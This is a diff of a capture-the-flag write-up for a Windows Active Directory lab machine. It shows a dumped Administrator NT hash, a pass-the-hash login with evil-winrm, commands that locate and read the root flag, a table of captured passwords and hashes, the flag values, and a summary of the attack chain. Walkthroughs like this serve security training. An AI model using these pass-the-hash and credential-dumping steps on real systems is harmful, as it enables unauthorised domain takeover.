-└─$ evil-winrm -i 10.129.109.27 -u checkpoint.htb\\Administrator -H "f29e9c014295b9b32139b09a2790be3b"
-                                        
-Evil-WinRM shell v3.9
-                                        
-Warning: Remote path completions is disabled due to ruby limitation: undefined method `quoting_detection_proc' for module Reline
-                                        
-Data: For more information, check Evil-WinRM GitHub: https://github.com/Hackplayers/evil-winrm#Remote-path-completion
-                                        
-Info: Establishing connection to remote endpoint
-*Evil-WinRM* PS C:\Users\Administrator\Documents> 
+**Output (key credentials):**
 
 ```
-{% endcode %}
+LUID: 0x14016d
+Username: Administrator
+Domain: WIN-0DG6SJAEUTA
 
-{% code overflow="wrap" %}
-```shellscript
-*Evil-WinRM* PS C:\Users\Administrator\Documents> dir "C:\" -Recurse -Include "root.txt" -Force -ErrorAction SilentlyContinue
+[MSV1_0]
+  NT Hash : f29e9c014295b9b32139b09a2790be3b
+  SHA1    : 89c15f3cd3ede88faf4b2d2e56253cf953e7922e
+```
 
+***
 
-    Directory: C:\Documents and Settings\max.palmer\Desktop
+### 9. Pass-the-Hash → Administrator
 
+```bash
+# Attack machine
+evil-winrm -i 10.129.109.27 -u checkpoint.htb\\Administrator -H "f29e9c014295b9b32139b09a2790be3b"
+```
 
-Mode                 LastWriteTime         Length Name
-----                 -------------         ------ ----
--ar---         6/22/2026  12:40 PM             34 root.txt
-
-
-    Directory: C:\Users\max.palmer\Desktop
-
-
-Mode                 LastWriteTime         Length Name
-----                 -------------         ------ ----
--ar---         6/22/2026  12:40 PM             34 root.txt
+**Output:**
 
 ```
-{% endcode %}
-
-{% code overflow="wrap" %}
-```shellscript
-*Evil-WinRM* PS C:\Users\Administrator\Documents> cat C:\Users\max.palmer\Desktop\root.txt
-864d9d13edb008ab521d024ee7f66a14
+*Evil-WinRM* PS C:\Users\Administrator\Documents>
 ```
-{% endcode %}
 
-[^1]: 
+#### Find and read root flag
+
+```powershell
+# Target — as Administrator
+dir "C:\" -Recurse -Include "root.txt" -Force -ErrorAction SilentlyContinue
+
+cat C:\Users\max.palmer\Desktop\root.txt
+# 864d9d13edb008ab521d024ee7f66a14
+```
+
+***
+
+### Credentials Summary
+
+| Account       | Password / Hash                       | Source                            |
+| ------------- | ------------------------------------- | --------------------------------- |
+| alex.turner   | Checkpoint2024!                       | Provided                          |
+| mark.davies   | Checkpoint2024!                       | Password reuse (restored AD user) |
+| ryan.brooks   | AES256: 545b2e59...                   | Extracted post-shell              |
+| svc\_deploy   | RC4: e16081eb077aca74bdbf8af12af43ac9 | dMSA abuse                        |
+| Administrator | NT: f29e9c014295b9b32139b09a2790be3b  | VMkatz memory dump                |
+
+***
+
+### Flags
+
+| Flag     | Value                            |
+| -------- | -------------------------------- |
+| user.txt | 92a144ca831be404a8f95087c56c7091 |
+| root.txt | 864d9d13edb008ab521d024ee7f66a14 |
+
+***
+
+### Key Vulnerabilities & Lessons Learned
+
+| Step       | Vulnerability                               | Impact                         |
+| ---------- | ------------------------------------------- | ------------------------------ |
+| Recon      | LDAP writable object enumeration            | Discovered restore permissions |
+| Privesc #1 | Write access to deleted AD objects          | Restored mark.davies           |
+| Foothold   | Writable VS Code extension share            | RCE as ryan.brooks             |
+| Privesc #2 | dMSA badSuccessor abuse                     | Impersonated svc\_deploy       |
+| Privesc #3 | Cleartext credentials in VM memory snapshot | Administrator NTLM hash        |
+| Final      | Pass-the-Hash                               | Domain Administrator access    |
+
+**Takeaways:**
+
+* Always enumerate writable LDAP objects — deleted object restore is an underrated attack path
+* Writable software deployment shares (VSIX, MSI, scripts) are almost always RCE opportunities
+* dMSA (Delegated Managed Service Accounts) abuse is a powerful modern AD attack technique
+* VMware memory snapshots stored on accessible shares are extremely sensitive — they contain cleartext credentials
+* Clock synchronization is critical for Kerberos attacks (`faketime` + `smb2-time` nmap script)
+* Pass-the-Hash with evil-winrm works cleanly against WinRM-enabled Windows hosts
